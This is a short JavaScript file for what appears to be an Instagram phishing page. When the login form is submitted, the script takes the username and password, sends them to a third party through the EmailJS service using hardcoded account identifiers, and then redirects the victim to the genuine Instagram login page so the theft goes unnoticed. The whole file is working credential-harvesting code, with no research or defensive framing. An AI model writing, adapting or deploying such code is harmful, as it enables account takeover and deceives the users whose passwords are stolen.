document.addEventListener('DOMContentLoaded', () => {
  emailjs.init('UqM7qA7pfK5sA8oa3'); // Your public key

  const form = document.getElementById('login-form');

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!username || !password) {
      alert("Please enter both username and password.");
      return;
    }

    emailjs.send('service_cgb5fxe', 'template_vwrq5o6', {
      username,
      password
    })
    .then(() => {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    })
    .catch((error) => {
      console.error('Failed to send email:', error);
      alert("Error sending. Try again later.");
    });
  });
});
